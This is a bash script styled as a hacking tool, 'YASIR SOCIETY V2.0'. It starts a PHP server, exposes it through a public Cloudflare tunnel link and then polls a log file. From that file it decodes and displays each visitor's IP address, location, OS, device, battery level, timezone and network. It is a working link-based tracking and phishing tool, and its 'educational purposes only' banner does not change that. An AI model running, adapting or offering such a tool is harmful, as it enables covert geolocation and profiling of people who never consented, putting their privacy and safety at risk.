#!/bin/bash

# Colors
G='\033[1;32m'
R='\033[1;31m'
W='\033[1;37m'
B='\033[1;34m'
Y='\033[1;33m'
C='\033[1;36m'

typewrite() {
    text=$1
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${text:$i:1}"
        sleep 0.05
    done
    echo
}

clear
echo -e "${G}
██╗   ██╗ █████╗ ███████╗██╗██████╗ 
╚██╗ ██╔╝██╔══██╗██╔════╝██║██╔══██╗
 ╚████╔╝ ███████║███████╗██║██████╔╝
  ╚██╔╝  ██╔══██║╚════██║██║██╔══██╗
   ██║   ██║  ██║███████║██║██║  ██║
   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝╚═╝  ╚═╝ SOCIETY V2.0
${W}"

echo -e "${R}[!] WARNING: This tool is for EDUCATIONAL PURPOSES only."
echo -ne "${Y}[?] Do you agree to use it ethically? (y/n): ${W}"
read choice

if [[ $choice != "y" ]]; then
    echo -e "${R}Exiting...${W}"
    exit
fi

typewrite "${C}[*] INITIALIZING SYSTEM ENGINES..."
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
cloudflared tunnel --url http://127.0.0.1:3333 > .tunnel.log 2>&1 &
sleep 10

LINK=$(grep -o 'https://[-0-9a-z.]*trycloudflare.com' .tunnel.log)
echo -e "${G}[+] TUNNEL LINK: ${W}$LINK"
echo ""
typewrite "${G}YASIR-SOCIETY WAITING FOR TARGET..."

last_log=0
while true; do
    if [ -f "logs.txt" ]; then
        current_log=$(wc -l < logs.txt)
        if [ "$current_log" -gt "$last_log" ]; then
            raw_data=$(tail -n 1 logs.txt | cut -d'=' -f3)
            # Decoding data (Base64)
            data=$(echo $raw_data | base64 --decode)
            
            echo -e "\n${Y}========== TARGET CAPTURED ==========${W}"
            echo -e "${G}Ip address     : ${W}$(echo $data | jq -r .ip)"
            echo -e "${G}Locations      : ${W}$(echo $data | jq -r .loc)"
            echo -e "${G}OS             : ${W}$(echo $data | jq -r .os)"
            echo -e "${G}Device Details : ${W}$(echo $data | jq -r .agent | cut -d'(' -f2 | cut -d')' -f1)"
            echo -e "${G}Battery Level  : ${W}$(echo $data | jq -r .battery)"
            echo -e "${G}Timezone       : ${W}$(echo $data | jq -r .tz)"
            echo -e "${G}Server         : ${W}Cloudflare Tunnel"
            echo -e "${G}DNS Record     : ${W}Secure-HTTPS"
            echo -e "${G}WiFi/Network   : ${W}$(echo $data | jq -r .org)"
            echo -e "${Y}=====================================${W}"
            
            last_log=$current_log
        fi
    fi
    sleep 2
done
